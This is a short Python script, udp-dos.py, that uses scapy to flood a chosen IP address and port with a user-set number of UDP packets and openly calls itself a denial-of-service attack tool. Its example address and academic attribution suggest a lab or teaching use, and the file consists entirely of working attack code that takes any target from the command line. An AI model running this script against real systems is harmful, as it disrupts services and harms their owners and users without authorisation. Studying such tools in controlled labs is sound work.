"""
Script Name: udp-dos.py
Description: A simple Python script that performs a UDP-based DoS attack at a specified target address.
Author: Paul Smith (Lancaster University)
Date: 2025-01-09
Version: 1.0
"""

from scapy.all import IP, UDP, send
import argparse

def send_udp_dos_packets(target_ip, target_port, count):
    """
    Sends a specified number of UDP packets to a target IP and port to simulate a DoS attack.

    :param target_ip: The IP address of the target.
    :param target_port: The port of the target.
    :param count: The number of packets to send.
    """
    # Construct the UDP packet
    packet = IP(dst=target_ip) / UDP(dport=target_port)

    print(f"Sending {count} UDP packets to {target_ip}:{target_port} for DoS attack...\n")

    # Send the packets
    for i in range(count):
        send(packet, verbose=False)
        print(f"Packet {i + 1} sent.")

    print("\nAll packets sent.")


def main():
    """
    Main function of the program. It collects arguments and calls the send_udp_dos_packets function.
    """
    # Parse the argument from the command line
    parser = argparse.ArgumentParser(description="A simple script that performs a UDP-based DOS attack for a target IP address and port number")
    parser.add_argument("target_ip", help="The target IP address, e.g. 172.20.0.2")
    parser.add_argument("target_port", help="The port number to send the packets to, e.g. 80")
    parser.add_argument("packet_count", help="The number of packets to send, e.g. 1000")
    args = parser.parse_args()

    # Cast the string parameters to integers
    target_port = int(args.target_port)
    packet_count = int(args.packet_count)

    # Check the port number is rationale and - if so - call the send_udp_packets function
    if target_port < 1 or target_port > 65535:
        print("Invalid port number. Ports must be between 1 and 65535.")
    else:
        send_udp_dos_packets(args.target_ip, target_port, packet_count)

if __name__ == "__main__":
    main()
